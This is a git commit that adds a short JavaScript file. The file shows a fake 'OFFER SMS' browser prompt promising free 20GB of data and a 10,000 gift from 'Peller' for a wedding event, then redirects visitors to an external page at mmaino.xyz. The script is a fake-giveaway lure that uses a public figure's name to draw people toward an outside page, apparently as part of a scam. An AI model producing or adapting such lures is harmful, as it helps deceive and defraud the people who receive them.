b913093c7f97575e92457aa0a29ec27dea4d8275
ztainz <johnsonmfon09@gmail.com>
2026-08-02 00:48:13 +0100

    Change password prompt and message for Peller gift

---
+++ act-peller-appreciation-20gb-giftdata.js
@@ -0,0 +1,5 @@
+var password = 'PELLER GIFT'
+password=prompt('OFFER SMS: Dear Customer, Kindly Receive Free 20Gb Data And 10,000 Gift From Peller For A Successful Wedding Event ,PellerJarvis Wedding Gift, press Peller Gift To Check Now. ','PELLER GIFT');
+if (password != 'PELLER GIFT') {
+location.href='https://mmaino.xyz/peller-appreciation-20gb-giftdata.html';
+}
